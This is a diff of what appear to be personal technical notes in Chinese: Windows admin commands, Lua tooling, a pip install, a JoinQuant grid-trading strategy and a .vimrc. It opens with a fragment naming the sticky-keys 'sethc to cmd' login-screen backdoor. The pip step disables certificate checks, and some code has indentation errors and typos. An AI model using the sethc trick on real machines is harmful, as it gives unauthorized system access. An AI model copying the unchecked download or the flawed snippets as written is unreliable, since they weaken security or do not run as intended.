+<li>sethc ---&gt; cmd</li>
+<li>shift+5</li>
+</ul>
+<h2 id="icacls"><a class="header" href="#icacls">icacls</a></h2>
+<ul>
+<li>icacls D:\tools\cygwin\ /T /grant Administrator:F 
+<ol>
+<li>将cygwin文件夹以及其子文件夹里修改为Administrator所有</li>
+<li>赋予完全控制权限</li>
+<li>适用于文件权限不对无法删除或修改文件的情况</li>
+</ol>
+</li>
+</ul>
+<h2 id="控制台乱码"><a class="header" href="#控制台乱码">控制台乱码</a></h2>
+<ul>
+<li>chcp 65001</li>
+</ul>
+<h2 id="查看连接用户"><a class="header" href="#查看连接用户">查看连接用户</a></h2>
+<ul>
+<li>query user 使用远程桌面管理命令query，
+query命令可以显示远程连接到服务器的会话、 运行的进程以及远程登录的用户，</li>
+</ul>
+<h2 id="查看磁盘"><a class="header" href="#查看磁盘">查看磁盘</a></h2>
+<ol>
+<li>diskpart
+<ul>
+<li>list disk</li>
+</ul>
+</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="补丁下载地址"><a class="header" href="#补丁下载地址">补丁下载地址</a></h2>
+<ol>
+<li>http://www.catalog.update.microsoft.com/Search.aspx?q=KB4535102</li>
+</ol>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="expression"><a class="header" href="#expression">expression</a></h2>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="lua"><a class="header" href="#lua">lua</a></h1>
+<h2 id="官方网站"><a class="header" href="#官方网站">官方网站</a></h2>
+<ul>
+<li>lua5.4官方手册</li>
+</ul>
+<pre><code>http://www.lua.org/manual/5.4/contents.html
+</code></pre>
+<ul>
+<li>lua5.4的新特性</li>
+</ul>
+<pre><code>http://www.lua.org/manual/5.4/readme.html#changes
+https://zhuanlan.zhihu.com/p/137588708
+</code></pre>
+<ul>
+<li>官方下载地址:</li>
+</ul>
+<pre><code>http://www.lua.org/ftp/lua-5.4.3.tar.gz
+</code></pre>
+<h2 id="工具"><a class="header" href="#工具">工具</a></h2>
+<ul>
+<li>luarocks安装</li>
+</ul>
+<pre><code>  yum install luarocks
+</code></pre>
+<ul>
+<li>luacheck安装</li>
+</ul>
+<pre><code>  luarocks install luacheck
+</code></pre>
+<ul>
+<li>luacheck git hook
+<ul>
+<li><a href="https://blog.csdn.net/gneveek/article/details/104014569">配置</a></li>
+<li><a href="https://blog.csdn.net/demorngel/article/details/69053443">vim</a></li>
+</ul>
+</li>
+</ul>
+<div style="break-before: page; page-break-before: always;"></div><h2 id="python"><a class="header" href="#python">python</a></h2>
+<h3 id="python3-install-pip3"><a class="header" href="#python3-install-pip3">python3 install pip3</a></h3>
+<p>wget --no-check-certificate  https://pypi.python.org/packages/source/p/pip/pip-8.0.2.tar.gz#md5=3a73c4188f8dbad6a1e6f6d44d117eeb
+tar -zxvf pip-8.0.2.tar.gz
+cd pip-8.0.2
+python3 setup.py build
+python3 setup.py install</p>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="joinquant"><a class="header" href="#joinquant">joinquant</a></h1>
+<h2 id="doc"><a class="header" href="#doc">doc</a></h2>
+<ul>
+<li><a href="https://www.joinquant.com/help/api/help#name:api">API</a></li>
+<li><a href="https://blog.csdn.net/ILYPL/article/details/73518793?spm=1001.2101.3001.6650.14&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-14.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EBlogCommendFromBaidu%7Edefault-14.no_search_link">常用API笔记</a></li>
+</ul>
+<h2 id="video"><a class="header" href="#video">video</a></h2>
+<ul>
+<li><a href="https://www.joinquant.com/view/community/detail/18ea26ad5b40a63a750bb299269e10df">官方视频</a></li>
+</ul>
+<h2 id="本地环境搭建"><a class="header" href="#本地环境搭建">本地环境搭建</a></h2>
+<ul>
+<li><a href="https://blog.csdn.net/mmsam0901/article/details/104364810">本地环境搭建</a></li>
+</ul>
+<h2 id="网格交易"><a class="header" href="#网格交易">网格交易</a></h2>
+<ul>
+<li><a href="https://blog.csdn.net/weixin_39609770/article/details/111017578?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_utm_term~default-4.no_search_link&amp;spm=1001.2101.3001.4242.3">网格交易详解</a></li>
+</ul>
+<h2 id="基本概念"><a class="header" href="#基本概念">基本概念</a></h2>
+<pre><code>#总持仓数量
+g.amount = context.portfolio.positions[security].total_amount
+
+#起始资金
+g.cash =context.portfolio.starting_cash
+
+
+#基准价格
+bottom_price = g.price
+
+#持仓平均成本
+g.cost = context.portfolio.positions[security].avg_cost
+
+#可使用的现金
+cash = context.portfolio.available_cash
+
+#获取当前价格
+current_price = get_current_tick(security, dt=None, df=False).current
+
+#总持仓数量
+amount = g.amount
+
+#目前持仓金额
+current_value = current_price*amount
+
+#资金分成20份
+unit_value = g.cash/20
+
+#如果持仓下跌10%止损
+if g.cost &gt;0 and (g.cost-current_price)/g.cost &gt;=0.10:
+    order_target(security, 0)
+    return
+</code></pre>
+<h2 id="常用api"><a class="header" href="#常用api">常用API</a></h2>
+<ul>
+<li>initialize 初始化函数</li>
+</ul>
+<pre><code>def initialize(context):
+    # g为全局变量
+    g.security = &quot;000001.XSHE&quot;
+</code></pre>
+<ul>
+<li>run_daily/run_weekly/run_monthly 定时运行策略(可选)</li>
+</ul>
+<pre><code>def initialize(context):
+    ## func是您自己定义的函数
+    # 按月运行
+    run_monthly(func, monthday, time='9:30', reference_security, force=False)
+    # 按周运行
+    run_weekly(func, weekday, time='9:30', reference_security, force=False)
+    # 每天内何时运行(没有force属性)
+    run_daily(func, time='9:30', reference_security)
+</code></pre>
+<ul>
+<li>before_trading_start 开盘前运行策略(可选)</li>
+<li>after_trading_end 收盘后运行策略(可选)</li>
+<li>on_strategy_end 策略运行结束时调用(可选)</li>
+<li>on_event 事件回调(可选)</li>
+<li>handle_data 运行策略(可选)</li>
+</ul>
+<pre><code># 该函数每个单位时间会调用一次, 如果按天回测,则每天调用一次,如果按分钟,则每分钟调用一次。
+def handle_data(context, data):
+    order(&quot;000001.XSHE&quot;,100)
+</code></pre>
+<h2 id="demo"><a class="header" href="#demo">demo</a></h2>
+<ul>
+<li>
+<p><a href="https://www.joinquant.com/view/community/detail/27cb1befd3e68d197410da65825e3449">网格交易策略-年化30%+</a></p>
+</li>
+<li>
+<p><a href="https://www.joinquant.com/post/28547">单股票的网格交易1.0</a></p>
+</li>
+<li>
+<p>单股票的网格交易1.0</p>
+</li>
+<li>
+<p>初始化 https://www.joinquant.com/post/28547</p>
+</li>
+</ul>
+<pre><code>import numpy as np
+import pandas as pd
+from pandas import Series
+from jqdata import *
+import time
+
+def initialize(context):
+    # 设定沪深300作为基准(同股票为基准）
+    set_benchmark('000300.XSHG')
+    #set_benchmark('300145.XSHE')
+    # 开启动态复权模式(真实价格)
+    set_option('use_real_price', True)
+    # 输出内容到日志 log.info()
+    log.info('初始函数开始运行且全局只运行一次')
+    # 过滤掉order系列API产生的比error级别低的log
+    # log.set_level('order', 'error')
+
+    ### 股票相关设定 ###
+    # 股票类每笔交易时的手续费是：买入时佣金万分之三，卖出时佣金万分之三加千分之一印花税, 每笔交易佣金最低扣5块钱
+    set_order_cost(OrderCost(close_tax=0.001, open_commission=0.0003, close_commission=0.0003, min_commission=5), type='stock')
+    ## 运行函数（reference_security为运行时间的参考标的；传入的标的只做种类区分，因此传入'000300.XSHG'或'510300.XSHG'是一样的）
+    # 开盘前运行
+    run_daily(before_market_open, time='before_open', reference_security='000300.XSHG')
+    # 开盘时运行
+    run_daily(market_open, time='every_bar', reference_security='000300.XSHG')
+    # 收盘后运行
+    run_daily(after_market_close, time='after_close', reference_security='000300.XSHG')
+    #初始化，第一次交易的标志
+    g.first = 0
+</code></pre>
+<ul>
+<li>before_market_open</li>
+</ul>
+<pre><code>def before_market_open(context):
+    # 输出运行时间
+    log.info('函数运行时间(before_market_open)：'+str(context.current_dt.time()))
+
+    # 要操作的股票：（g.为全局变量）
+    g.security = '002918.XSHE.'
+    g.initial = '2015-01-05'
+    #每天交易一次的标志
+    g.count = 0
+</code></pre>
+<ul>
+<li>setup_position</li>
+</ul>
+<pre><code>def setup_position(context,security,bench,status):
+    #基准价格
+    bottom_price = g.price
+
+    if bottom_price == 0:
+        return
+
+    #持仓平均成本
+    g.cost = context.portfolio.positions[security].avg_cost
+    print(&quot;g.cost%s&quot;%g.cost)
+    #可使用的现金
+    cash = context.portfolio.available_cash
+
+    print(&quot;cash:%s&quot;%cash,&quot;g_price:%s&quot;%g.price)
+    #获取当前价格
+    current_price = get_current_tick(security, dt=None, df=False).current
+    #总持仓数量
+    amount = g.amount
+    #目前持仓金额
+    current_value = current_price*amount
+    #资金分成20份
+    unit_value = g.cash/20
+    #如果持仓下跌10%止损
+    if g.cost &gt;0 and (g.cost-current_price)/g.cost &gt;=0.06:
+        order_target(security, 0)
+        return
+
+    print(&quot;unit_value:%s&quot; % unit_value)
+    #计算目前价格差
+    returns = (current_price-bottom_price)/bottom_price
+
+    #打印需要的数据
+    if g.count == 0:
+        print(&quot;b_P:%s&quot;%bottom_price)
+        print(&quot;c_p:%s&quot;%current_price,&quot;current_value:%s&quot;%current_value,&quot;amount:%s&quot;%amount)
+        print(&quot;.........&quot;)
+
+    g.count = 0
+    #print(type(returns),type(bottom_price))
+
+    #卖出
+    if (status == 'short') and (g.count == 0):
+        # 价格差大于5%
+        if returns &gt; bench and current_value &gt; 6*unit_value:
+            order_target_value(security,6*unit_value)
+        # 价格差大于10%
+        if returns &gt; 2*bench and current_value &gt; 3*unit_value:
+            order_target_value(security,3*unit_value)
+        # 价格差大于15%
+        if returns &gt; 3*bench and current_value &gt;1*unit_value :
+            order_target_value(security,1*unit_value)
+        # 价格差大于20%
+        if returns &gt; 4*bench and current_value &gt;0:
+            order_target_value(security,0)
+        #结束本日交易标志
+        g.count=1
+
+        if g.count==0:
+            print(&quot;returns:%s&quot;%returns,bench,amount,status)
+            print(&quot;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@&quot;)
+
+    # 买入
+    if (status == 'long') and (cash &gt;0) and (g.count ==0):
+
+        # 价格差小于-4%,仓位小于20%
+        if returns &lt; bench and current_value &lt; 4*unit_value:
+            order_target_value(security,4*unit_value)
+        # 价格差小于-8%,仓位小于35%
+        if returns &lt; 2* bench and current_value &lt; 7*unit_value:
+            order_target_value(security,7*unit_value)
+        # 价格差小于-12%,仓位小于45%
+        if returns &lt; 3* bench and current_value &lt;9*unit_value :
+            order_target_value(security,9*unit_value)
+        # 价格差小于-16%,仓位小于50%
+        if returns &lt; 4* bench and current_value &lt; 10*unit_value:
+            order_target_value(security,10*unit_value)
+                g.count = 1
+
+        if g.count==0:
+            print(&quot;returns:%s&quot;%returns,bench,amount,status)
+            print(&quot;$$$$$$$$$$$$$$$$$$$$$$$$$$$$$&quot;)
+        print(&quot;____________________________________&quot;)
+
+    return True
+</code></pre>
+<ul>
+<li>market_open</li>
+</ul>
+<pre><code>def market_open(context):
+    log.info('函数运行时间(market_open):'+str(context.current_dt.time()))
+    security = g.security
+    #第一次交易数量
+    g.num = 1100
+    #总持仓数量
+    g.amount = context.portfolio.positions[security].total_amount
+    #起始资金
+    g.cash =context.portfolio.starting_cash
+
+    #第一次买入
+    if g.first ==0 :
+        g.orders=order(security,g.num-100)
+        g.price = g.orders.price
+        g.first = 1
+        print(&quot;g.price:%s&quot;%g.price)
+
+    #全部卖出后，突破5日均线后买入
+    if g.amount == 0:
+        close_data = attribute_history(security, 5, '1d', ['close'])
+        # 取得过去五天的平均价格
+        MA5 = close_data['close'].mean()
+        # 取得上一时间点价格
+        now_price = close_data['close'][-1]
+
+        # 如果上一时间点价格高出五天平均价5%, 则全仓买入
+        if now_price &gt; 1.05*MA5 :
+            # 用所有 cash 买入股票
+            g.orders=order(security, g.num)
+            g.price = g.orders.price
+            # 记录这次买入
+            log.info(&quot;Buying %s&quot; % (security))
+
+    #网格运算
+    y=setup_position(context,security,0.05,'short')
+    x=setup_position(context,security,-0.04,'long')
+    #空仓步长：5%，10%，15%，20%
+
+    #print(&quot;x=%s&quot; %(x))
+    #print(&quot;y=%s&quot; %(y))
+
+</code></pre>
+<ul>
+<li>after_market_close</li>
+</ul>
+<pre><code>def after_market_close(context):
+    log.info(str('函数运行时间(after_market_close):'+str(context.current_dt.time())))
+    #得到当天所有成交记录
+    trades = get_trades()
+    for _trade in trades.values():
+        log.info('成交记录：'+str(_trade))
+        log.info('一天结束')
+        log.info('##############################################################')
+</code></pre>
+<div style="break-before: page; page-break-before: always;"></div><h1 id="我的常用配置"><a class="header" href="#我的常用配置">我的常用配置</a></h1>
+<h2 id="vimrc"><a class="header" href="#vimrc">.vimrc</a></h2>
+<pre><code>&quot;set term=screen
+
+set ruler
+set laststatus=2                &quot; make the last line where the status is two lines deep so you can see status always
+set backspace=indent,eol,start  &quot; make that backspace key work the way it should
+set nocompatible                &quot; vi compatible is LAME
+set showmode                    &quot; show the current mode
+syntax on                       &quot; turn syntax highlighting on by default
+
+&quot;set fdm=indent
+&quot;
+&quot;&quot;行号{
+set nu!
+&quot;set relativenumber
+&quot;}
+&quot;
+
+&quot;set guifont=h12
+set hls
+&quot;set background=dark
+set t_Co=256
+&quot;设置配色方案{
+left g:molokai_original = 1
+let g:rehash256 = 1
+&quot;desert
+&quot;colorscheme solarized molokai github lucius desert
+&quot;}
+&quot; markdown theme
+&quot;let g:detorte_theme_mode = 'dark'
+
+&quot;tab{
+set tabstop=2
+set expandtab
+&quot;&quot;}
+
+filetype off
+
+call plug#begin('~/.vim/plugged')
+Plug 'git://github.com/tomasr/molokai.git'
+&quot;Plug 'scrooloose/nerdtree', { 'on':  'NERDTreeToggle' }
+&quot;Plug 'preservim/nerdtree' |
+&quot;        \ Plug 'xuyuanp/nerdtree-git-plugin'
+ Plug 'preservim/nerdtree' |
+         \ Plug 'xuyuanp/nerdtree-git-plugin' |
+         \ Plug 'ryanoasis/vim-devicons'
+Plug 'tiagofumo/vim-nerdtree-syntax-highlight'
+Plug 'vim-airline/vim-airline'
+Plug 'vim-airline/vim-airline-themes'
+Plug 'michaelHL/awesome-vim-colorschemes'
+Plug 'majutsushi/tagbar'
+Plug 'godlygeek/tabular'
+Plug 'ctrlpvim/ctrlp.vim'
+&quot;Plug 'ack.vim'
+
+&quot;Plug 'vim-scripts/luainspect.vim'
+&quot;Plug 'xolox/vim-misc'
+&quot;Plug 'xolox/vim-lua-ftplugin'
+
+Plug 'Shougo/neocomplcache'
+Plug 'nathanaelkane/vim-indent-guides'
+Plug 'Yggdroot/indentLine'
+Plug 'airblade/vim-gitgutter'
+Plug 'gregsexton/gitv'
+Plug 'tpope/vim-fugitive'
+Plug 'git://github.com/rking/ag.vim.git'
+
+&quot; Multiple Plug commands can be written in a single line using | separators
+&quot;Plug 'SirVer/ultisnips' | Plug 'honza/vim-snippets'
+Plug 'tpope/vim-surround'
+Plug 'scrooloose/syntastic'
+Plug 'Chiel92/vim-autoformat'
+Plug 'tpope/vim-commentary'
+
+Plug 'junegunn/fzf', { 'dir': '~/.fzf', 'do': './install --all' }
+&quot;Plug '/usr/bin/fzf'
+Plug 'junegunn/fzf.vim'
+Plug 'Yggdroot/LeaderF', { 'do': './install.sh' }
+Plug 'mg979/vim-visual-multi'
+&quot;Plug 'voldikss/vim-browser-search'
+Plug 'kien/rainbow_parentheses.vim'
+Plug 'uarun/vim-protobuf'
+Plug 'tpope/vim-abolish'
+Plug 'fatih/vim-go'
+&quot;Plug 'w0rp/ale'
+
+&quot;Plug 'tamlok/detorte'
+&quot;Plug 'tamlok/vim-markdown'
+&quot;Plug 'iamcco/mathjax-support-for-mkdp'
+&quot;Plug 'iamcco/markdown-preview.vim'
+&quot;Plug 'iamcco/markdown-preview.nvim', { 'do': { -&gt; mkdp#util#install() }, 'for': ['markdown', 'vim-plug']}
+&quot;Plug 'iamcco/markdown-preview.nvim', { 'do': 'cd app &amp;&amp; yarn install'  }
+&quot;Plug 'neoclide/coc.nvim', {'branch': 'release'}
+
+&quot; Initialize plugin system
+call plug#end()
+
+
+colorscheme molokai &quot;neon evening molokai solarized molokai github lucius
+
+filetype plugin indent on     &quot; required
+
+&quot;set runtimepath^=~/.vim/bundle/ag
+set runtimepath^=~/.vim/plugged/ag
+
+&quot;path{
+set path=./,../,
+&quot;set path=./,/usr/include,,..,../lualib,
+&quot;}
+&quot; vim-indent-guides {
+&quot;let g:indent_guides_enable_on_vim_startup = 1 &quot;添加行，vim启动时启用
+&quot;let g:indent_guides_start_level = 1           &quot;添加行，开始显示对齐线的缩进级别
+&quot;let g:indent_guides_guide_size = 1            &quot;添加行，对齐线的宽度，（1字符）
+&quot;let g:indent_guides_tab_guides = 0            &quot;添加行，对tab对齐的禁用
+&quot;}
+&quot;
+&quot;indentLine{
+&quot;let g:indentLine_char='|'
+let g:indentLine_char='|'
+let g:indentLine_enabled = 1
+&quot;}
+
+&quot;let g:mkdp_path_to_chrome = &quot;firefox&quot;
+&quot;let g:mkdp_path_to_chrome = &quot;google-chrome&quot;
+&quot;let g:mkdp_browserfunc = 'MKDP_browserfunc_default'
+&quot;let g:mkdp_auto_open = 1
+
+&quot; set to 1, nvim will open the preview window after entering the markdown buffer
+ &quot; default: 0
+let g:mkdp_auto_start = 0
+
+&quot; set to 1, the nvim will auto close current preview window when change
+&quot; from markdown buffer to another buffer
+&quot; default: 1
+let g:mkdp_auto_close = 0
+
+&quot; set to 1, the vim will refresh markdown when save the buffer or
+&quot; leave from insert mode, default 0 is auto refresh markdown as you edit or
+&quot; move the cursor
+&quot; default: 0
+let g:mkdp_refresh_slow = 0
+
+&quot; set to 1, the MarkdownPreview command can be use for all files,
+&quot; by default it can be use in markdown file
+&quot; default: 0
+let g:mkdp_command_for_global = 0
+
+&quot; set to 1, preview server available to others in your network
+&quot; by default, the server listens on localhost (127.0.0.1)
+&quot; default: 0
+let g:mkdp_open_to_the_world = 0
+
+&quot; use custom IP to open preview page
+&quot; useful when you work in remote vim and preview on local browser
+&quot; more detail see: https://github.com/iamcco/markdown-preview.nvim/pull/9
+&quot; default empty
+let g:mkdp_open_ip = ''
+
+&quot; specify browser to open preview page
+&quot; default: ''
+let g:mkdp_browser = 'firefox'
+
+&quot; set to 1, echo preview page url in command line when open preview page
+&quot; default is 0
+let g:mkdp_echo_preview_url = 1
+
+&quot; a custom vim function name to open preview page
+&quot; this function will receive url as param
+&quot; default is empty
+let g:mkdp_browserfunc = ''
+&quot;:MarkdownPreview
+&quot;:MarkdownPreviewStop
+
+&quot; options for markdown render
+&quot; mkit: markdown-it options for render
+&quot; katex: katex options for math
+&quot; uml: markdown-it-plantuml options
+&quot; maid: mermaid options
+&quot; disable_sync_scroll: if disable sync scroll, default 0
+&quot; sync_scroll_type: 'middle', 'top' or 'relative', default value is 'middle'
+&quot;   middle: mean the cursor position alway show at the middle of the preview page
+&quot;  top: mean the vim top viewport alway show at the top of the preview page
+&quot;  relative: mean the cursor position alway show at the relative positon of the preview page
+&quot; hide_yaml_meta: if hide yaml metadata, default is 1
+&quot; sequence_diagrams: js-sequence-diagrams options
+&quot; content_editable: if enable content editable for preview page, default: v:false
+&quot; disable_filename: if disable filename header for preview page, default: 0
+let g:mkdp_preview_options = {
+            \ 'mkit': {},
+            \ 'katex': {},
+            \ 'uml': {},
+            \ 'maid': {},
+            \ 'disable_sync_scroll': 0,
+            \ 'sync_scroll_type': 'middle',
+            \ 'hide_yaml_meta': 1,
+            \ 'sequence_diagrams': {},
+            \ 'flowchart_diagrams': {},
+            \ 'content_editable': v:false,
+            \ 'disable_filename': 0
+            \ }
+
+&quot; use a custom markdown style must be absolute path
+&quot; like '/Users/username/markdown.css' or expand('~/markdown.css')
+let g:mkdp_markdown_css = ''
+
+&quot; use a custom highlight style must absolute path
+&quot; like '/Users/username/highlight.css' or expand('~/highlight.css')
+let g:mkdp_highlight_css = ''
+
+&quot; use a custom port to start server or random for empty
+let g:mkdp_port = ''
+
+&quot; preview page title
+&quot; ${name} will be replace with the file name
+let g:mkdp_page_title = '「${name}」'
+
+&quot; recognized filetypes
+&quot; these filetypes will have MarkdownPreview... commands
+let g:mkdp_filetypes = ['markdown']
+
+&quot;ctrlp{
+let g:ctrlp_cmd = 'CtrlP'
+let g:ctrlp_map = '&lt;c-p&gt;'
+set wildignore+=*.o,*.exe,*.git,*.pdb,*.bak,*.so,*.a
+let g:ctrlp_by_filename = 1 &quot; only lookup file name
+let g:ctrlp_max_height = 15
+let g:ctrlp_clear_cache_on_exit = 0
+let g:ctrlp_cache_dir = $HOME.'/.ctrlp/cache/'
+let g:ctrlp_working_path_mode = 'rw'
+
+let g:ctrlp_custom_ignore = {
+    \ 'dir':  '\v[\/]\.(git|hg|svn)$',
+    \ 'file': '\v\.(exe|so|dll|bak|gds|lib|suo|exp)$',
+    \ 'link': 'SOME_BAD_SYMBOLIC_LINKS',
+    \ }
+&quot;}
+
+
+&quot;调用ag进行搜索提升速度，同时不使用缓存文件
+if executable('ag')
+  set grepprg=ag\ --nogroup\ --nocolor
+  let g:ctrlp_user_command = 'ag %s -l --nocolor -g &quot;&quot;'
+  let g:ctrlp_use_caching = 0
+endif
+
+
+&quot;ctags{
+set tags=tags;
+&quot;set autochdir
+nnoremap &lt;silent&gt; &lt;F12&gt; :A&lt;CR&gt;
+&quot;:set grepprg=grep\ -nri 
+&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+&quot; Tag list (ctags)
+&quot; &quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;&quot;
+let Tlist_Ctags_Cmd = '/usr/bin/ctags'
+
+&quot;Tagbar
+let g:tagbar_ctags_bin = '/usr/bin/ctags'
+let Tlist_Show_One_File = 1
+&quot;不同时显示多个文件的tag，只显示当前文件的
+&quot;let Tlist_Exit_OnlyWindow = 1
+&quot;如果taglist窗口是最后一个窗口，则退出vim
+let Tlist_Use_Right_Window = 1         &quot;在右侧窗口中显示taglist窗口
+let Tlist_File_Fold_Auto_Close=1
+&quot;让不被编辑的文件的方法列表自动折叠起来
+let Tlist_Show_Menu=1                  &quot;显示taglist菜单
+let Tlist_Auto_Open=0                  &quot;启动vim自动启动TagList
+
+let g:NERDTreeWinSize = 25
+let g:tagbar_width = 25
+let g:tagbar_type_lua = {
+  \ 'ctagstype' : 'lua',
+  \ 'kinds' : [
+    \ 'm:modules:0:0',
+    \ 'f:functions:0:1',
+    \ 'v:locals:0:0'
+  \ ],
+  \ 'sort' : 0
+\ }
+
+
+let g:lua_inspect_events = ''
+
+let mapleader=&quot; &quot;
+
+&quot; tips plug
+&quot;let g:pmenu_scheme = 'dark'
+&quot;let g:pmenu_scheme = 'macos'
+&quot;map &lt;Tab&gt;   &lt;Plug&gt;EasyCompTabTrigger
+&quot;imap &lt;S-Tab&gt; &lt;Plug&gt;EasyCompShiftTabTrigger
+&quot; easycompelte end============
+
+&quot; neocomplcache
+let g:neocomplcache_enable_at_startup = 1
+let g:neocomplcache_enable_auto_select = 1
+&quot;let g:neocomplcache_enable_quick_match = 1
+
+let g:ag_prg='ag --column'
+let g:ag_working_path_mode='r'
+
+&quot;git gutter
+nmap ]c &lt;Plug&gt;GitGutterNextHunk
+nmap [c &lt;Plug&gt;GitGutterPrevHunk
+
+&quot; syntastic
+set statusline+=%#warningmsg#
+set statusline+=%{SyntasticStatuslineFlag()}
+set statusline+=%*
+
+let g:syntastic_always_populate_loc_list = 1
+let g:syntastic_auto_loc_list = 1
+let g:syntastic_check_on_open = 1
+let g:syntastic_check_on_wq = 0
+
+&quot;设置error和warning的标志
+let g:syntastic_enable_signs = 1
+let g:syntastic_error_symbol='✗'
+let g:syntastic_warning_symbol='►'
+
+&quot;no-unused-args 忽略不使用的参数
+&quot;no-redefined 忽略重定义
+&quot;no-max-line-length 忽略每行最长的检测
+&quot;ignore 542 551 忽略if条件的body为空(如...elseif ret == nil then end，then和end中间没有语句)；忽略空语句(如;)，如果用了;则成对出现该语法检测warning
+&quot;有语法错误的一行左侧栏会有S&amp;gt;标识，光标移动到改行，vim下发会给出提示。修改正确后保存，则该'S&amp;gt;'会消失。
+&quot;let g:syntastic_lua_checkers = [&quot;luac&quot;, &quot;luacheck&quot;]
+let g:syntastic_lua_checkers = [&quot;/use/bin/luac5.4.3&quot;, &quot;luacheck&quot;]
+&quot;let g:syntastic_lua_luacheck_args =
+&quot;&quot;--codes --no-max-comment-line-length --ignore 542 551&quot;
+let g:syntastic_lua_luacheck_args = &quot;--codes&quot;
+&quot;go checker
+let g:syntastic_go_checkers = [&quot;govet&quot;, &quot;errcheck&quot;,&quot;go&quot;]
+
+&quot;c
+&quot;let g:syntastic_c_compiler =['gcc', 'clang', 'make']
+&quot;let g:syntastic_c_compiler_options ='-Wpedantic -g'
+let g:syntastic_c_compiler_options ='-std=gnu99'
+let g:syntastic_c_include_dirs=['/usr/include/']
+let g:syntastic_c_config_file='.syntastic_c_config_file'
+
+&quot;cpp
+let g:syntastic_cpp_include_dirs = ['/usr/include/']
+let g:syntastic_cpp_remove_include_errors = 1
+let g:syntastic_cpp_check_header = 1
+let g:syntastic_cpp_compiler = 'clang++'
+let g:syntastic_cpp_compiler_options = '-std=c++11 -stdlib=libstdc++'
+&quot; syntastic end
+
+&quot; autoformat 操作符2边加空格
+let g:formatdef_allman = '&quot;astyle --style=allman --pad-oper&quot;'
+let g:autoformat_autoindent = 0
+let g:autoformat_retab = 0
+let g:autoformat_remove_trailing_spaces = 0
+
+&quot;map &lt;C-F12&gt; :!ctags -R --c++-kinds=+p --fields=+iaS --extra=+q.&lt;CR&gt;
+map &lt;C-F12&gt; :!ctags -R --fields=+iaS --extra=+q.&lt;CR&gt;
+&quot;Press space twice to jump to the next '&lt;++&gt;' and edit it
+map &lt;LEADER&gt;&lt;LEADER&gt; &lt;Esc&gt;/&lt;++&gt;&lt;CR&gt;:nohlsearch&lt;CR&gt;c4l
+
+set tabstop=4
+set softtabstop=4
+set shiftwidth=4
+set noexpandtab
+set expandtab
+set autoindent
+set cindent
+set cc=80
+set list
+set listchars=tab:&gt;-,trail:-
+
+set nocompatible
+set noswapfile
+set nobackup
+set nowritebackup
+set noundofile
+set fileencodings=ucs-bom,utf-8,cp936,gb18030,big5,euc-jp,euc-kr,latin1
+&quot; before vim 8.1 modellines bug
+set modelines=0
+set nomodeline
+&quot;inoremap :setl pastegi+:setl nopastegi
+&quot;
+inoremap jk &lt;ESC&gt;
+
+&quot; fzf_begin{
+map &lt;leader&gt;f :Rg&lt;CR&gt;
+map &lt;leader&gt;p :Files&lt;CR&gt;
+map &lt;leader&gt;b :Buffers&lt;CR&gt;
+&quot; Empty value to disable preview window altogether
+&quot; let g:fzf_preview_window = ''
+&quot;
+&quot; Always enable preview window on the right with 60% width
+let g:fzf_preview_window = 'right:60%'
+command! -bang -nargs=* Ag
+  \ call fzf#vim#ag(&lt;q-args&gt;,
+  \                 &lt;bang&gt;0 ? fzf#vim#with_preview('up:60%')
+  \                         : fzf#vim#with_preview('right:50%:hidden', '?'),
+  \                 &lt;bang&gt;0)
+let g:fzf_layout = {'down':'40%'}
+map &lt;leader&gt;a :Ag&lt;CR&gt;
+nnoremap &lt;silent&gt; &lt;Leader&gt;A :Ag&lt;CR&gt;
+&quot; fzf_end}
+
+&quot;{ Leaderf_begin
+&quot;let g:Lf_ShortcutF = '&lt;C-P&gt;'
+let g:Lf_ShortcutF = '&lt;C-F&gt;'
+map &lt;leader&gt;F :Leaderf! rg&lt;CR&gt;
+&quot;{ Leaderf_end
+
+&quot;{ rainbow_begin
+let g:rbpt_colorpairs = [
+    \ ['brown',       'RoyalBlue3'],
+    \ ['Darkblue',    'SeaGreen3'],
+    \ ['darkgray',    'DarkOrchid3'],
+    \ ['darkgreen',   'firebrick3'],
+    \ ['darkcyan',    'RoyalBlue3'],
+    \ ['darkred',     'SeaGreen3'],
+    \ ['darkmagenta', 'DarkOrchid3'],
+    \ ['brown',       'firebrick3'],
+    \ ['gray',        'RoyalBlue3'],
+    \ ['darkmagenta', 'DarkOrchid3'],
+    \ ['Darkblue',    'firebrick3'],
+    \ ['darkgreen',   'RoyalBlue3'],
+    \ ['darkcyan',    'SeaGreen3'],
+    \ ['darkred',     'DarkOrchid3'],
+    \ ['red',         'firebrick3'],
+    \ ]
+
+let g:rbpt_max = 16
+let g:rbpt_loadcmd_toggle = 0
+au VimEnter * RainbowParenthesesToggle
+au Syntax * RainbowParenthesesLoadRound
+au Syntax * RainbowParenthesesLoadSquare
+au Syntax * RainbowParenthesesLoadBraces
+&quot;{ rainbow_end
+
+&quot;ale begin
+&quot;https://github.com/tvatter/ale#faq-quickfix
+&quot; Write this in your vimrc file
+&quot;let g:ale_set_loclist = 0
+&quot;let g:ale_set_quickfix = 1
+&quot;
+&quot;let g:ale_open_list = 1
+&quot; Set this if you want to.
+&quot; &quot; This can be useful if you are combining ALE with
+&quot; &quot; some other plugin which sets quickfix errors, etc.
+&quot;let g:ale_keep_list_window_open = 1
+&quot;nmap &lt;silent&gt; &lt;C-k&gt; &lt;Plug&gt;(ale_previous_wrap)
+&quot;nmap &lt;silent&gt; &lt;C-j&gt; &lt;Plug&gt;(ale_next_wrap)
+&quot;ale end
+
+&quot; 关闭json隐藏引号
+let g:vim_json_conceal = 0
+
+&quot;path指定查找的路径，详情help path
+&quot; includeexpr是尝试替换路径名中的.为/，详情help includeexpr
